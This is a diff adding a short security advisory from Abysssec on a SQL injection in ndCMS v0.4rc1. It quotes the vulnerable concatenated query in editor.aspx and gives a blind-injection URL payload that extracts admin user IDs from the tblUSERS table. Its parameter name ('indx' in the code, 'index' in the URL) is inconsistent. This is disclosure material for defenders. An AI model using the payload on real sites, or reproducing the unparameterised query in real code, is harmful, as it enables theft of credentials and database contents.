@@ -1,0 +1,45 @@
+'''
+  __  __  ____         _    _ ____  
+ |  \/  |/ __ \   /\  | |  | |  _ \ 
+ | \  / | |  | | /  \ | |  | | |_) |
+ | |\/| | |  | |/ /\ \| |  | |  _ < 
+ | |  | | |__| / ____ \ |__| | |_) |
+ |_|  |_|\____/_/    \_\____/|____/ 
+
+http://www.exploit-db.com/moaub-27-ndcms-sql-injection-vulnerability/
+
+'''
+
+
+
+Abysssec Inc Public Advisory
+ 
+ 
+  Title            :  ndCMS Sql Injection Vulnerability
+  Affected Version :  ndCMS(Nickel and Dime CMS) v0.4rc1
+  Discovery        :  www.abysssec.com
+  Download Links   :  http://souurceforge.net/projects/ndcms-net
+  Login Page       :  http://localhost/ndcms/admin/?Mode=Express&indx=
+ 
+Description :
+===========================================================================================      
+  This version of ndCMS has Sql Injection Vulnerability that its DataBase is Access
+  with  Table of Users   : tblUSERS 
+                 Columns : userid , passwd.
+
+
+  Vulnerable Code:
+         .../express_edit/editor.aspx
+  Ln 65:
+         dbr = db.ExecuteReader("Select * from tblPAGES WHERE indx=" + Request.Params["indx"]);
+    
+   
+   Considering to the code, for example you can browse this URL:
+   
+         http://Example.com/express_edit/editor.aspx?index=1+AND+1=IIF((select mid(last(userid),1,1) from (select top 1 userid from tblUSERS))='a',1,2)
+
+   and so on.
+   
+
+===========================================================================================
+ 
